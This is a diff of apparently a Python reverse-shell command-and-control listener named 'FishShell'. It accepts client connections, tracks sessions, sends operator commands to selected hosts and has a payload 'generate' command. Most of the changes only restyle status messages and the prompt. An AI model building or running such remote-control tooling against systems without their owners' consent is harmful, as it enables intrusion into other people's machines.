@@ -63,12 +63,12 @@ def start_server():
         ping.bind((g.host, pn_port))
         g.server.listen()
         ping.listen()
-        msg = f"[{g.g}Info{g.e}] Listening on '{g.host}' at port '{g.port}'"
+        msg = f"{g.info} Listening on '{g.host}' at port '{g.port}'"
         return True, msg
     except OSError:
-        msg = f"[{g.r}Error{g.e}] Specified port already in use\n[{g.bl}Fix{g.e}]    Use 'set lport <PORT> to set a different port"
+        msg = f"{g.error} Specified port already in use\n{g.fix}    Use 'set lport <PORT> to set a different port"
     except Exception as msg:
-        msg = f"[{g.r}Error{g.e}] {msg}"
+        msg = f"{g.error} {msg}"
     g.server = None
     g.accept = False
     return False, msg
@@ -80,7 +80,7 @@ def release_output_buffer():
         with lock:
             print([lines for lines in output_buffer][0])
             output_buffer.clear()
-            print('\nFishShell >>> ', end='')
+            print(f'\n{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}', end='')
 
 
 def accept_connections():
@@ -94,11 +94,11 @@ def accept_connections():
             when = datetime.now()
             g.all_conns[Id] = [client, addr, platform, when, None, 'Active']
             g.active_conns[Id] = [client, addr, platform, when, None]
-            print_msg = f"\n\n[{g.g}Info{g.e}] New Connection!\n[{g.g}Info{g.e}] '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'"
+            print_msg = f"\n\n{g.info} New Connection!\n{g.info} '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'"
             output_buffer.append(print_msg)
         except Exception as error:
             if not g.till and g.accept:
-                print_msg = f"\n\n[{g.r}Error{g.e}] Error While accepting Connections\n[{g.r}Error Code{g.e}] {error}"
+                print_msg = f"\n\n{g.error} Error While accepting Connections\n[{g.r}Error Code{g.e}] {error}"
                 output_buffer.append(print_msg)
         if isShell:
             release_output_buffer()
@@ -130,6 +130,7 @@ def accept_ping():
 
 
 def send_ping():
+    global output_buffer
     while not g.till:
         current_conns = g.active_conns.copy()
         if not current_conns:
@@ -148,9 +149,13 @@ def send_ping():
                 close.append(Id)
         for Id in close:
             try:
+                print_msg = f"\n\n{g.info} Connection closed!\n{g.info} '{str(g.active_conns[Id][1][0])}:{str(g.active_conns[Id][1][1])}', client id '{Id}' has disconnected from the server"
+                output_buffer.append(print_msg)
                 del g.active_conns[Id]
             except:
                 pass
+        # if isShell:
+        #     release_output_buffer()
     return
 
 
@@ -219,10 +224,10 @@ def select_client(Id):
             client = g.active_conns[Id][0]
             addr = g.active_conns[Id][1]
             print()
-            print(f"Joined session of [{addr[0]}:{addr[1]}]")
+            print(f"{g.info} Joined session of [{addr[0]}:{addr[1]}]")
             print()
             client.send(b'start')
-            send_command(client=client, Id=Id)
+            send_command(client=client, Id=Id, ip=addr[0])
         except sock.timeout:
             print()
             print("Session may have died")
@@ -292,7 +297,7 @@ def shell():
     while not g.till:
         try:
             print()
-            cmnd = input("FishShell >>> ")
+            cmnd = input(f"{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}")
             if cmnd == 'help':
                 help_menu(command='help')
             elif 'help' in cmnd or '-h' in cmnd:
@@ -302,8 +307,8 @@ def shell():
             elif cmnd[:3] == 'set':
                 if g.server is not None:
                     print()
-                    print(f"[{g.r}Error{g.e}] Server already running")
-                    print(f"[{g.bl}Fix{g.e}]   Restart the program to change 'lhost' or 'lport'")
+                    print(f"{g.error} Server already running")
+                    print(f"{g.fix}   Restart the program to change 'lhost' or 'lport'")
                     continue
                 if '-i' in cmnd or '--lhost' in cmnd:
                     g.host = cmnd.replace('set --lhost ', '').replace('set -i ', '')
@@ -315,13 +320,13 @@ def shell():
                     print(f'lport set to --> {g.port}')
                 else:
                     print()
-                    print(f"[{g.r}Error{g.e}] Invalid arguments...")
-                    print(f"[{g.bl}Fix{g.e}]   Enter set --help to view usage")
+                    print(f"{g.error} Invalid arguments...")
+                    print(f"{g.fix}   Enter set --help to view usage")
             elif cmnd[:8] == 'generate':
                 generate(data=cmnd)
             elif cmnd == 'listen':
                 if g.server is not None:
-                    print(f"\n[{g.r}Error{g.e}] Listener can only be started once")
+                    print(f"\n{g.error} Listener can only be started once")
                     continue
                 if g.host == '192.168.29.17' and g.port == 3784:
                     print()
@@ -340,8 +345,8 @@ def shell():
                     list_all_connections()
                 else:
                     print()
-                    print(f"[{g.r}Error{g.e}] Invalid arguments...")
-                    print(f"[{g.bl}Fix{g.e}]   Enter list --help to view usage")
+                    print(f"{g.error} Invalid arguments...")
+                    print(f"{g.fix}   Enter list --help to view usage")
             elif cmnd[:6] == 'select':
                 if cmnd[7:10] == '-id':
                     Id = cmnd[11:]
@@ -350,13 +355,13 @@ def shell():
                     isShell = True
                 else:
                     print()
-                    print(f"[{g.r}Error{g.e}] Invalid arguments...")
-                    print(f"[{g.bl}Fix{g.e}]   Enter select --help to view usage")
+                    print(f"{g.error} Invalid arguments...")
+                    print(f"{g.fix}   Enter select --help to view usage")
             elif cmnd[:5] == 'close':
                 if g.server is None:
                     print()
-                    print(f"[{g.r}Error{g.e}] No active connections to close")
-                    print(f"[{g.bl}Fix{g.e}]   Enter 'listen' to start listening for connections")
+                    print(f"{g.error} No active connections to close")
+                    print(f"{g.fix}   Enter 'listen' to start listening for connections")
                     continue
                 if cmnd[6:] == '-id':
                     Id = cmnd[10:]
@@ -365,8 +370,8 @@ def shell():
                     close_all_connections()
                 else:
                     print()
-                    print(f"[{g.r}Error{g.e}] Invalid arguments...")
-                    print(f"[{g.bl}Fix{g.e}]    Enter close --help to view usage")
+                    print(f"{g.error} Invalid arguments...")
+                    print(f"{g.fix}    Enter close --help to view usage")
             elif cmnd.lower() in ['exit', 'quit', 'q', 'x']:
                 print()
                 print("Enter 'qs' to exit/quit shell")
@@ -418,7 +423,7 @@ def shell():
             print(error)
             shell()
         if output_buffer:
-            print('FishShell >>> ', end='')
+            print(f'{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}', end='')
             print([lines for lines in output_buffer][0])
             output_buffer.clear()
     return
